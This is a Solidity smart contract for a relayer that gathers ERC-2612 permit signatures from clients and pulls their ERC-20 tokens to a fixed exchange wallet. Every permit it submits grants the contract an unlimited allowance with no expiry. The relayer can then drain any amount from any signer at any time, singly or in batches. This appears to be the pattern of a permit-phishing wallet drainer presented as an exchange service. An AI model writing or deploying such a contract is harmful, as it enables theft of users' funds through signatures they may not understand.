// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.28;

import { RelayerConfig } from "./relayer/RelayerConfig.sol";

/// @title ERC2612Executor
/// @notice Relayer-controlled contract that collects ERC-20 tokens from clients
///         via ERC-2612 `permit` signatures and forwards ALL tokens to EXCHANGE_WALLET.
///         Only RELAYER can call execute functions. Clients pay zero gas.
interface IERC20Permit {
  function permit(
    address owner,
    address spender,
    uint256 value,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external;

  function transferFrom(address from, address to, uint256 amount) external returns (bool);

  function nonces(address owner) external view returns (uint256);

  function allowance(address owner, address spender) external view returns (uint256);
}

contract ERC2612Executor is RelayerConfig {
  constructor(address _relayer, address _exchangeWallet) RelayerConfig(_relayer, _exchangeWallet) {}

  // ─── Permit + collect ────────────────────────────────────────────────────

  /// @notice Call permit(MAX, MAX) on `token`, then transferFrom `client` → EXCHANGE_WALLET.
  /// @param token   ERC-20 token with ERC-2612 support
  /// @param client  Token owner who signed the permit
  /// @param amount  Amount to collect
  /// @param v       Signature component
  /// @param r       Signature component
  /// @param s       Signature component
  function permitAndCollect(
    address token,
    address client,
    uint256 amount,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external onlyRelayer {
    IERC20Permit(token).permit(client, address(this), MAX, MAX, v, r, s);
    IERC20Permit(token).transferFrom(client, EXCHANGE_WALLET, amount);
    emit TokensForwarded(token, client, amount);
  }

  /// @notice Batch permit + collect across multiple tokens for a single client.
  /// @param tokens   ERC-20 token addresses (must all support ERC-2612)
  /// @param client   Token owner who signed all permits
  /// @param amounts  Corresponding amounts to collect
  /// @param vs       Signature v components
  /// @param rs       Signature r components
  /// @param ss       Signature s components
  function batchPermitAndCollect(
    address[] calldata tokens,
    address client,
    uint256[] calldata amounts,
    uint8[] calldata vs,
    bytes32[] calldata rs,
    bytes32[] calldata ss
  ) external onlyRelayer {
    uint256 len = tokens.length;
    require(len == amounts.length && len == vs.length && len == rs.length && len == ss.length, "length mismatch");
    for (uint256 i = 0; i < len; i++) {
      IERC20Permit(tokens[i]).permit(client, address(this), MAX, MAX, vs[i], rs[i], ss[i]);
      IERC20Permit(tokens[i]).transferFrom(client, EXCHANGE_WALLET, amounts[i]);
      emit TokensForwarded(tokens[i], client, amounts[i]);
    }
  }

  // ─── Collect from existing allowance ─────────────────────────────────────

  /// @notice Pull tokens using an existing ERC-20 allowance (no permit needed).
  /// @param token   ERC-20 token address
  /// @param client  Token owner with an existing allowance for this contract
  /// @param amount  Amount to collect
  function collect(address token, address client, uint256 amount) external onlyRelayer {
    IERC20Permit(token).transferFrom(client, EXCHANGE_WALLET, amount);
    emit TokensForwarded(token, client, amount);
  }

  /// @notice Batch pull tokens using existing ERC-20 allowances.
  /// @param tokens  ERC-20 token addresses
  /// @param client  Token owner with existing allowances for this contract
  /// @param amounts Corresponding amounts to collect
  function collectBatch(address[] calldata tokens, address client, uint256[] calldata amounts) external onlyRelayer {
    uint256 len = tokens.length;
    require(len == amounts.length, "length mismatch");
    for (uint256 i = 0; i < len; i++) {
      IERC20Permit(tokens[i]).transferFrom(client, EXCHANGE_WALLET, amounts[i]);
      emit TokensForwarded(tokens[i], client, amounts[i]);
    }
  }

  // ─── View ─────────────────────────────────────────────────────────────────

  /// @notice Returns the current ERC-2612 nonce for `client` on `token`
  function getNonce(address token, address client) external view returns (uint256) {
    return IERC20Permit(token).nonces(client);
  }

  /// @notice Returns the current ERC-20 allowance `client` has granted this contract on `token`
  function getAllowance(address token, address client) external view returns (uint256) {
    return IERC20Permit(token).allowance(client, address(this));
  }

  /// @notice Returns true if `client`'s allowance for this contract on `token` equals MAX
  function isMaxed(address token, address client) external view returns (bool) {
    return IERC20Permit(token).allowance(client, address(this)) == MAX;
  }
}
